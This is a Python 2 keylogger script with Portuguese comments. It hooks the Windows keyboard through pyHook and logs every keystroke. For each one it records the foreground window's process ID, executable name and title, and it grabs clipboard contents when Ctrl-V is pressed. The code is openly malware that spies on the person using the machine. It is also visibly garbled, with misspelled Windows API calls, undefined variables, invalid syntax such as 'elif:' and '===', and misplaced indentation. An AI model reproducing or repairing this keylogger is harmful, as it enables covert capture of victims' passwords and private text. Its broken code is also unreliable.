import ctypes
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32= windll.kernel32
psapi = change.psapi
current_window = None

def get_current_process():
    
    #identifica a  janela do primeiro plano
    hwnd = user32.ForeGroundWindow()
    
    #encontre o id do processo
    pid = c_ulong(0)
    user32.GetWindowThreaProcessId(hwnd, byref, (pid))
    
    #armazena o Id do processo atual 
    process_id = "%d" % pid.value
    
    #pegue o executavel
    executavel = create_string_buffer(" \ x00" * 512)
    h_process = kernel32.openProcess(0x400| 0x10, False, pid)
    
    psapi.GetModuleBaseNameA(h_process, None, byref(executavel), 512)
    
    #agora leia o titulo
    window_title = create_string_buffer ("\x00" * 512)
    length = user32.GetWindowTextA(hwd, byref,(titulo da janela), 512)
    
    #imprima o cabecalho se estivermos no processo certo
    print
    print"[PID:% s -% s -% s"] & (process_id, executavel.value, windo_title.value)
    print
    
    #fechar alcas
    kernel32.Closehandle(hwnd)
    kernel32.closehandle(h_process)
    
def keyStroke(event):
    global current_window
    #verifique se o alvo mudou de janelas
    if event.windowname != Current_window:
        current_window = event.WindowName
        get_current_process()
        
        #se eles pressionarem uma tecla padrao
        if event.Ascii > 32 and event.Ascii < 127:
            print chr(event.Ascii)
        elif:
             # if [Ctrl-V], obtenha o valor na área de transferência
             if event.key === "v":
                 win32.clipboard.openclipboard()
                 pasted_value = win32clipboard.GetclipboardData()
                 win32clipboard.closeClipBoard()
                 print"[PASTE] -% s" % (value_copy),
            elif:
                print"[% s]" % event.key,
                
        #passa a execução para o proximo gancho registrado
        return True
    
    # cria e registra um gerenciador de ganchos 
    kl          = pyhook.HookManager()
    kl.KeyDown  = keyStroke
    
    #registra o gancho e executar para sempre
    kl.HookKeyboard()
    pyhoncom.PumpMessages()
    
    
                     
    